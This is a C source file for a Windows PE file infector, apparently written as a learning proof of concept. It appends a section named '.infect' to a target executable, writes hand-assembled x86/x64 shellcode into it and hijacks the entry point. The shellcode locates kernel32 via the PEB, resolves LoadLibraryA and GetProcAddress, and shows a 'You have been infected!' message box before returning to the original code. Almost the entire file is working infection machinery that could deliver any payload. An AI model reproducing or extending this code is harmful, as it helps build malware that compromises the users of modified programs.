#include "main.h"

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Missing argument.\n");
        printf("Usage: section path\\to\\PE\\executable (Windows)\n");
        exit(1);
    }

    // argv[1] = Path to executable
    FILE *fr = fopen(argv[1], "r+b");
    if (fr == NULL) {
        printf("Error %d opening file.\n", errno);
        end(fr, 1);
    }

    const char *data[] = {
        "Notice",
        "You have been infected!",
        "LoadLibraryA",
        "GetProcAddress",
        "user32.dll",
        "MessageBoxA",
    };

    IMAGE_DOS_HEADER imageDosHeader;
    IMAGE_FILE_HEADER imageFileHeader;
    IMAGE_OPTIONAL_HEADER imageOptionalHeader;

    // Verify magic byte (0x4D 0x5A == "MZ")
    imageDosHeader.e_magic = getval(fr, dw, SEEK_SET, 0);
    if (imageDosHeader.e_magic != 0x5a4d) {
        printf("Input error. File is not a PE executable.");
        end(fr, 1);
    }

    imageDosHeader.e_lfanew = getval(fr, dd, SEEK_SET, 0x3C);

    imageFileHeader.NumberOfSections =
            getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew + 6);
    setval_int(fr, imageFileHeader.NumberOfSections + 1,
               dw,SEEK_SET, imageDosHeader.e_lfanew + 6);

    imageFileHeader.SizeOfOptionalHeader =
            getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew + 20);

    DWORD ioh_offset = imageDosHeader.e_lfanew + 24;

    // 0x10B => 32-bit
    // 0x20B => 64-bit
    imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_offset);
    int size = imageOptionalHeader.Magic == 0x10B ? dd : dq;

    // TO-DO: Change entry point
    imageOptionalHeader.AddressOfEntryPoint =
            getval(fr, dd, SEEK_SET, ioh_offset + 16);
    // Keep a copy
    const DWORD old_entry = imageOptionalHeader.AddressOfEntryPoint;
    if (imageOptionalHeader.Magic == 0x10B)
        imageOptionalHeader.ImageBase =
                getval(fr,dd, SEEK_SET, ioh_offset + 28);
    else if (imageOptionalHeader.Magic == 0x20B)
        imageOptionalHeader.ImageBase =
                getval(fr, dq, SEEK_SET, ioh_offset + 24);
    else {
        printf("Magic error.");
        end(fr, 1);
    }
    imageOptionalHeader.SectionAlignment =
            getval(fr, dd, SEEK_SET, ioh_offset + 32);
    imageOptionalHeader.FileAlignment =
            getval(fr, dd, SEEK_SET, ioh_offset + 36);
    imageOptionalHeader.SizeOfImage =
            getval(fr, dd, SEEK_SET, ioh_offset + 56);
    imageOptionalHeader.SizeOfHeaders =
            getval(fr, dd, SEEK_SET, ioh_offset + 60);

    // Import Table
    imageOptionalHeader.DataDirectory[1].VirtualAddress = getval(fr, dd, SEEK_SET,
                                                                 ioh_offset + (imageOptionalHeader.Magic == 0x10B
                                                                                   ? 104
                                                                                   : 120)); // import_rva
    imageOptionalHeader.DataDirectory[1].Size = getval(fr, dd, SEEK_SET,
                                                       ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 108 : 124));

    // Import Address Table (IAT)
    imageOptionalHeader.DataDirectory[12].VirtualAddress = getval(fr, dd, SEEK_SET,
                                                                  ioh_offset + (imageOptionalHeader.Magic == 0x10B
                                                                      ? 192
                                                                      : 208)); // iat_rva
    imageOptionalHeader.DataDirectory[12].Size = getval(fr, dd, SEEK_SET,
                                                        ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 196 : 212));

    IMAGE_SECTION_HEADER lastish;
    lastish.PointerToRawData = 0;
    DWORD lastish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader +
                           40 * (imageFileHeader.NumberOfSections - 1);

    // // File offset for Import Table and RVA of the containing section
    // DWORD import_offset, import_section_offset, import_section_rva = 0;
    // // File offset for IAT and RVA of the containing section
    // DWORD iat_offset, iat_section_offset, iat_section_rva = 0;
    // for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
    //     DWORD current_rva = getval(fr, dd, SEEK_SET,
    //                                ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40 * i + 12);
    //     DWORD current_offset = getval(fr,dd, SEEK_SET,
    //                                   ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40 * i + 20);
    //
    //     // Find file offset of Import Table
    //     if (current_rva > import_section_rva && current_rva <= imageOptionalHeader.DataDirectory[1].VirtualAddress) {
    //         import_section_rva = current_rva;
    //         import_section_offset = current_offset;
    //         import_offset = imageOptionalHeader.DataDirectory[1].VirtualAddress - current_rva + current_offset;
    //         // = imageOptionalHeader.DataDirectory[1].VirtualAddress - import_section_rva + import_section_offset;
    //     }
    //     if (current_rva > iat_section_rva && current_rva <= imageOptionalHeader.DataDirectory[12].VirtualAddress) {
    //         iat_section_rva = current_rva;
    //         iat_section_offset = current_offset;
    //         iat_offset = imageOptionalHeader.DataDirectory[12].VirtualAddress - current_rva + current_offset;
    //         // = imageOptionalHeader.DataDirectory[12].VirtualAddress - iat_section_rva + iat_section_offset;
    //     }
    //
    //     Find PointerToRawData of the last section
    //     Necessary? Not if section header is organised by the order of the sections' appearance in the programme
    //     if (current_offset > lastish.PointerToRawData) {
    //         lastish.PointerToRawData = current_offset;
    //         lastish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40 * i;
    //     }
    // }

    lastish.VirtualAddress =
            getval(fr, dd, SEEK_SET, lastish_offset + 12);
    lastish.SizeOfRawData = getval(fr, dd, SEEK_SET, lastish_offset + 16);

    DWORD newish_offset = lastish_offset + 40;
    IMAGE_SECTION_HEADER newish = {
        // Name
        ".infect",
        // Misc.VirtualSize
        0, // Edited below to reflect actual size
        // VirtualAddress
        closest(lastish.VirtualAddress + lastish.SizeOfRawData, imageOptionalHeader.SectionAlignment),
        // SizeOfRawData
        0, // Edited below
        // PointerToRawData
        0, // Edited below
        // PointerToRelocations
        0,
        // PointerToLinenumbers
        0,
        // NumberOfRelocations
        0,
        // NumberOfLinenumbers
        0,
        // Characteristics
        0x60000060,
        // IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
        // 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
    };

    // Pad previous section to align with FileAlignment
    fseek(fr, 0, SEEK_END);
    const DWORD old_end = ftell(fr);
    newish.PointerToRawData = closest(old_end + 1, imageOptionalHeader.FileAlignment);
    pad(fr, newish.PointerToRawData - old_end);

    // Write data[]
    for (int i = 0; i < sizeof(data) / sizeof(data[0]); ++i)
        // Each entry is written at newish.PointerToRawData + data[i] - data[0]
        fwrite(data[i], strlen(data[i]) + 1, 1, fr);

    // Insert new address of entry point
    imageOptionalHeader.AddressOfEntryPoint = ftell(fr) - newish.PointerToRawData + newish.VirtualAddress;
    setval_int(fr, imageOptionalHeader.AddressOfEntryPoint, dd, SEEK_SET, ioh_offset + 16);
    fseek(fr, 0, SEEK_END);

    // Binary codes generated by https://defuse.ca/online-x86-assembler.htm

    // Delta technique
    // call immediately_after ; EntryPoint + 1 + dd in mem stored in stack
    instruct(fr, 0xe8, 0, dd);

    // Save all registers
    // push r|eax
    write_instruction(fr, 0x50);
    // push r|ecx
    write_instruction(fr, 0x51);
    // push r|edx
    write_instruction(fr, 0x52);
    // push r|ebx
    write_instruction(fr, 0x53);
    // push r|esi
    write_instruction(fr, 0x56);
    // push r|edi
    write_instruction(fr, 0x57);
    // push r|ebp
    write_instruction(fr, 0x55);

    int stack_reserved = 0;
    struct {
        // Each variable holds the address in the MEMORY
        int ImageBaseAddress;
        int OldEntryPoint;
        int Inject; // Beginning of the newly injected section
        int kernel32dll;
        int OrdinalTbl;
        int NamePtrTbl;
        int AddrTbl;
        int user32dll;
        // Order probably doesn't matter
        // but it's better for organisation if ordered according to appearance in the stack
    } mem_stack; // Location of each variable IN THE STACK, relative to r|ebp

    // Establish new stack frame
    // mov r|ebp, r|esp
    REX_IF64
    write_instruction(fr, 0x89e5);
    // sub r|esp, stack_reserved
    REX_IF64
    instruct(fr, 0x83ec, stack_reserved, db); // Placeholder value
    const int stack_reserved_offset = ftell(fr);

    // mov r|eax, [ebp + 0x1C] OR [rbp + 0x38] ; Retrieve EntryPoint + 1 + dd in mem
    REX_IF64
    instruct(fr, 0x8b45, 7 * size, db);
    // sub r|eax, imageOptionalHeader.AddressOfEntryPoint + 1 + dd ; get ImageBaseAddress in mem stored in r|eax
    REX_IF64
    instruct(fr, 0x2d, imageOptionalHeader.AddressOfEntryPoint + 1 + dd, dd);
    // mov [r|ebp + ImageBaseAddress], r|eax
    REX_IF64
    instruct(fr, 0x8945, mem_stack.ImageBaseAddress = -(stack_reserved += size), db);

    // add r|eax (ImageBaseAddress), old_entry
    REX_IF64
    instruct(fr, 0x05, old_entry, dd);
    // mov [r|ebp + OldEntryPoint], r|eax
    REX_IF64
    instruct(fr, 0x8945, mem_stack.OldEntryPoint = -(stack_reserved += size), db);

    // mov r|eax, [r|ebp + ImageBaseAddress]
    REX_IF64
    instruct(fr, 0x8b45, mem_stack.ImageBaseAddress, db);
    // add r|eax, newish.VirtualAddress
    REX_IF64
    instruct(fr, 0x05, newish.VirtualAddress, dd);
    // mov [r|ebp + Inject], r|eax
    REX_IF64
    instruct(fr, 0x8945, mem_stack.Inject = -(stack_reserved += size), db);

    // Find kernel32.dll (https://idafchev.github.io/blog/writing_windows_shellcode/#find-the-dll-base-address)
    if (imageOptionalHeader.Magic == 0x10B) {
        // mov ebx, fs:0x30 ; Retrieve PEB address
        write_instruction(fr, 0x64); // FS segment override prefix
        instruct(fr, 0x8B1D, 0x30,dd);
    } else {
        // mov rbx, gs:0x60
        write_instruction(fr, 0x65); // GS segment override prefix
        REX_IF64
        instruct(fr, 0x8B1C25, 0x60, dd);
    }
    // mov r|ebx, [ebx + 0x0C] OR [rbx + 0x18] ; Get LdrData in PEB
    REX_IF64
    instruct(fr, 0x8b5b, imageOptionalHeader.Magic == 0x10B ? 0xc : 0x18, db);
    // mov r|ebx, [ebx + 0x14] OR [rbx + 0x20] ; 
    REX_IF64
    instruct(fr, 0x8b5b, imageOptionalHeader.Magic == 0x10B ? 0x14 : 0x20, db);
    // mov r|ebx, [r|ebx]
    REX_IF64
    write_instruction(fr, 0x8b1b);
    // mov r|ebx, [r|ebx]
    REX_IF64
    write_instruction(fr, 0x8b1b);
    // mov r|ebx, [ebx + 0x10] OR [rbx + 0x20] ; Get BaseAddress of kernel32.dll
    REX_IF64
    instruct(fr, 0x8b5b, imageOptionalHeader.Magic == 0x10B ? 0x10 : 0x20, db);
    // mov [r|ebp + kernel32dll], r|ebx
    REX_IF64
    instruct(fr, 0x895d, mem_stack.kernel32dll = -(stack_reserved += size), db);

    // mov eax, [r|ebx + 3Ch]
    instruct(fr, 0x8b43, 0x3c, db); // RVA of PE signature
    // add r|eax, r|ebx
    REX_IF64
    write_instruction(fr, 0x01d8);
    // mov eax, [eax + 78h] OR [rax + 88h]
    instruct(fr, 0x8b80, 24 + (imageOptionalHeader.Magic == 0x10B ? 96 : 112), dd); // RVA of Export Table
    // add r|eax, r|ebx
    REX_IF64
    write_instruction(fr, 0x01d8);
    // mov ecx, [r|eax + 24h]
    instruct(fr, 0x8b48, 36,db); // RVA of Ordinal Table
    // add r|ecx, r|ebx
    REX_IF64
    write_instruction(fr, 0x01d9);
    // mov [r|ebp + OrdinalTbl], r|ecx
    REX_IF64
    instruct(fr, 0x894d, mem_stack.OrdinalTbl = -(stack_reserved += size),db);
    // mov edi, [r|eax + 20h]
    instruct(fr, 0x8b78, 32,db); // RVA of Name Pointer Table
    // add r|edi, r|ebx
    REX_IF64
    write_instruction(fr, 0x01df);
    // mov [r|ebp + NamePtrTbl], r|edi
    REX_IF64
    instruct(fr, 0x897d, mem_stack.NamePtrTbl = -(stack_reserved += size),db);
    // mov edx, [r|eax + 1Ch]
    instruct(fr, 0x8b50, 28,db); // RVA of Address Table
    // add r|edx, r|ebx
    REX_IF64
    write_instruction(fr, 0x01da);
    // mov [r|ebp + AddrTbl], r|edx
    REX_IF64
    instruct(fr, 0x8955, mem_stack.AddrTbl = -(stack_reserved += size), db);
    // mov edx, [r|eax + 14h]
    instruct(fr, 0x8b50, 20,db); // Number of exported functions
    // xor r|eax, r|eax
    REX_IF64
    write_instruction(fr, 0x31c0);

    // Find "LoadLibraryA"
    const int lla_loopback = ftell(fr);
    // mov r|edi, [r|ebp + NamePtrTbl]
    REX_IF64
    instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
    // mov edi, [r|edi + r|eax*4]
    write_instruction(fr, 0x8b3c87);
    // add r|edi, r|ebx
    REX_IF64
    write_instruction(fr, 0x01df);
    // mov r|esi, [r|ebp + Inject]
    REX_IF64
    instruct(fr, 0x8b75, mem_stack.Inject, db);
    // add r|esi, &data[2]
    REX_IF64
    instruct(fr, 0x83c6, data[2] - data[0], db);
    // xor r|ecx, r|ecx
    REX_IF64
    write_instruction(fr, 0x31c9);
    // cld
    write_instruction(fr, 0xfc);
    // add cx, strlen(data[2])
    instruct(fr, 0x6683c1, strlen(data[2]) + 1, db);
    // repe cmpsb
    write_instruction(fr, 0xf3a6);
    // jz found
    instruct(fr, 0x0f84, 0,dd); // Placeholder value to be edited later
    const int lla_jz_found = ftell(fr);

    // inc r|eax
    REX_IF64
    write_instruction(fr, 0xffc0);
    // cmp r|eax,r|edx
    REX_IF64
    write_instruction(fr, 0x39d0);
    // jb loopback
    instruct(fr, 0x0f82, lla_loopback - (ftell(fr) + 2 + dd), dd);
    // From lla_loopback to the end of the current instruction

    // jmp entry
    write_instruction(fr, 0xe9); // Not found, go to entry point, filled later
    pad(fr, 4);
    const int lla_jmp_entry = ftell(fr); // Save address to be edited later

    // Found "LoadLibraryA", r|eax hold address
    setval_int(fr, ftell(fr) - lla_jz_found, dd, SEEK_SET, lla_jz_found - dd);
    fseek(fr, 0, SEEK_END);
    // mov r|ecx, [r|ebp + OrdinalTbl]
    REX_IF64
    instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
    // mov r|edx, [r|ebp + AddrTbl]
    REX_IF64
    instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
    // mov ax, [r|ecx + r|eax*2]
    write_instruction(fr, 0x668b0441);
    // mov eax, [r|edx + r|eax*4]
    write_instruction(fr, 0x8b0482);
    // add r|eax, r|ebx
    REX_IF64
    write_instruction(fr, 0x01d8); // r|eax holds mem addr of LoadLibraryA
    // mov r|ecx, [r|ebp + Inject]
    REX_IF64
    instruct(fr, 0x8b4d, mem_stack.Inject, db);
    // add r|ecx, &data[4]
    REX_IF64
    instruct(fr, 0x83c1, data[4] - data[0], db);
	// push ecx ("user32.dll") (32-bit only)
    if (imageOptionalHeader.Magic == 0x10B)
	    write_instruction(fr, 0x51);
    // call r|eax
    write_instruction(fr, 0xffd0);
    // mov [r|ebp + user32dll], r|eax
    REX_IF64
    instruct(fr, 0x8945, mem_stack.user32dll = -(stack_reserved += size), db);
    // mov r|ecx, [r|ebp + OrdinalTbl]
    REX_IF64
    instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
    // mov r|edx, [r|ebp + AddrTbl]
    REX_IF64
    instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
    // xor r|eax, r|eax
    REX_IF64
    write_instruction(fr, 0x31c0);

    // Find "GetProcAddress"
    const int gpa_loopback = ftell(fr);
    // mov r|edi, [r|ebp + NamePtrTbl]
    REX_IF64
    instruct(fr, 0x8b7d, mem_stack.NamePtrTbl, db);
    // mov edi, [r|edi + r|eax*4]
    write_instruction(fr, 0x8b3c87);
    // add r|edi, r|ebx
    REX_IF64
    write_instruction(fr, 0x01df);
    // mov r|esi, [r|ebp + Inject]
    REX_IF64
    instruct(fr, 0x8b75, mem_stack.Inject, db);
    // add r|esi, &data[3]
    REX_IF64
    instruct(fr, 0x83c6, data[3] - data[0], db);
    // xor r|ecx, r|ecx
    REX_IF64
    write_instruction(fr, 0x31c9);
    // cld
    write_instruction(fr, 0xfc);
    // add cx, strlen(data[3])
    instruct(fr, 0x6683c1, strlen(data[3]) + 1, db);
    // repe cmpsb
    write_instruction(fr, 0xf3a6);
    // jz found
    instruct(fr, 0x0f84, 0,dd); // Placeholder value to be edited later
    const int gpa_jz_found = ftell(fr);

    // inc r|eax
    REX_IF64
    write_instruction(fr, 0xffc0);
    // cmp r|eax,r|edx
    REX_IF64
    write_instruction(fr, 0x39d0);
    // jb loopback
    instruct(fr, 0x0f82, gpa_loopback - (ftell(fr) + 2 + dd), dd);
    // From lla_loopback to the end of the current instruction

    // jmp entry
    write_instruction(fr, 0xe9); // Not found, go to entry point, filled later
    pad(fr, 4);
    const int gpa_jmp_entry = ftell(fr); // Save address to be edited later

    // Found "GetProcAddress", r|eax hold address
    setval_int(fr, ftell(fr) - gpa_jz_found, dd, SEEK_SET, gpa_jz_found - dd);
    fseek(fr, 0, SEEK_END);
    // mov r|ecx, [r|ebp + OrdinalTbl]
    REX_IF64
    instruct(fr, 0x8b4d, mem_stack.OrdinalTbl, db);
    // mov r|edx, [r|ebp + AddrTbl]
    REX_IF64
    instruct(fr, 0x8b55, mem_stack.AddrTbl, db);
    // mov ax, [r|ecx + r|eax*2]
    write_instruction(fr, 0x668b0441);
    // mov eax, [r|edx + r|eax*4]
    write_instruction(fr, 0x8b0482);
    // add r|eax, r|ebx
    REX_IF64
    write_instruction(fr, 0x01d8); // r|eax holds mem addr of GetProcAddress
    // mov r|edx, [r|ebp + Inject]
    REX_IF64
    instruct(fr, 0x8b95, mem_stack.Inject, dd);
    // add r|edx, &data[5] ("MessageBoxA")
    REX_IF64
    instruct(fr, 0x81c2, data[5] - data[0], dd);
    // mov r|ecx, [r|ebp + user32dll]
    REX_IF64
    instruct(fr, 0x8b8d, mem_stack.user32dll, dd);
    if (imageOptionalHeader.Magic == 0x10B) {
        // push edx
        write_instruction(fr, 0x52);
        // push ecx
        write_instruction(fr, 0x51);
    }
    // call r|eax (GetProcAddress)
    write_instruction(fr, 0xffd0); // r|eax holds mem addr of MessageBoxA

    // Invoke MessageBoxA
    // This is actually compressible, but im too lazy rn
    if (imageOptionalHeader.Magic == 0x10B) {
        // push 2030h (Type)
        instruct(fr, 0x68, MB_OK | MB_ICONWARNING | MB_TASKMODAL, dd);
        // mov edx, [ebp + Inject] ; Also address of data[0]
        instruct(fr, 0x8b55, mem_stack.Inject, db);
        // push edx ("Notice")
        write_instruction(fr, 0x52);
        // add edx, &data[1]
        instruct(fr, 0x83c2, data[1] - data[0], db);
        // push edx ("You have been infected!")
        write_instruction(fr, 0x52);
        // push 0 (hWnd)
        instruct(fr, 0x6a, 0, db);
    } else {
        // mov r9, 0x2030
        instruct(fr, 0x49c7c1, 0x2030, dd);
        // mov r8, [rbp + 30]
        instruct(fr, 0x4c8b45, mem_stack.Inject, db);
        // mov rdx, r8
        write_instruction(fr, 0x4c89c2);
        // add rdx, 10
        instruct(fr, 0x4883c2, data[1] - data[0], db);
        // xor rcx, rcx
        write_instruction(fr, 0x4831c9);
    }
    // call r|eax (MessageBoxA)
    write_instruction(fr, 0xFFD0);

    const int to_entry = ftell(fr);
    // Fill in value at jmp entry LoadLibraryA
    setval_int(fr, to_entry - lla_jmp_entry, dd, SEEK_SET, lla_jmp_entry - dd);
    // Fill in value at jmp entry GetProcAddress
    setval_int(fr, to_entry - gpa_jmp_entry, dd, SEEK_SET, gpa_jmp_entry - dd);
    // Fill in value at stack_reserved_offset
    setval_int(fr, stack_reserved, db, SEEK_SET, stack_reserved_offset - db);

    fseek(fr, 0, SEEK_END);
    // Reinstate stack
    // add r|esp, stack_reserved
    REX_IF64
    instruct(fr, 0x83c4, stack_reserved, db);
    // pop r|ebp
    write_instruction(fr, 0x5d);
    // pop r|edi
    write_instruction(fr, 0x5f);
    // pop r|esi
    write_instruction(fr, 0x5e);
    // pop r|ebx
    write_instruction(fr, 0x5b);
    // pop r|edx
    write_instruction(fr, 0x5a);
    // pop r|ecx
    write_instruction(fr, 0x59);
    // pop r|eax
    write_instruction(fr, 0x58);

    // jmp [r|esp - 7 * size + OldEntryPoint]
    // Obtain address of OldEntryPoint in mem stored in the stack before the pops
    instruct(fr, 0xff6424, -7 * size + mem_stack.OldEntryPoint, db);

    newish.Misc.VirtualSize = ftell(fr) - newish.PointerToRawData;
    newish.SizeOfRawData = closest(newish.Misc.VirtualSize, imageOptionalHeader.FileAlignment);
    pad(fr, newish.SizeOfRawData - newish.Misc.VirtualSize);

    // Write to Section Header
    setval_char(fr, newish.Name, 8, SEEK_SET, newish_offset);
    setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
    setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
    setval_int(fr, newish.SizeOfRawData, dd, SEEK_CUR, 0);
    setval_int(fr, newish.PointerToRawData, dd, SEEK_CUR, 0);
    setval_int(fr, newish.PointerToRelocations, dd, SEEK_CUR, 0);
    setval_int(fr, newish.PointerToLinenumbers, dd, SEEK_CUR, 0);
    setval_int(fr, newish.NumberOfRelocations, dw, SEEK_CUR, 0);
    setval_int(fr, newish.NumberOfLinenumbers, dw, SEEK_CUR, 0);
    setval_int(fr, newish.Characteristics, dd, SEEK_CUR, 0);

    // Edit SizeOfImage
    imageOptionalHeader.SizeOfImage = closest(imageOptionalHeader.SizeOfImage + newish.SizeOfRawData,
                                              imageOptionalHeader.SectionAlignment);
    setval_int(fr, imageOptionalHeader.SizeOfImage, dd, SEEK_SET, ioh_offset + 56);

    // Edit SizeOfHeaders (only if SectionHeader needs to be expanded)
    //    imageOptionalHeader.SizeOfHeaders = closest(imageOptionalHeader.SizeOfHeaders + 40,
    //                                                imageOptionalHeader.FileAlignment);
    //    setval_int(fr, imageOptionalHeader.SizeOfHeaders, dd, SEEK_SET, ioh_offset + 60);

    end(fr, 0);
}
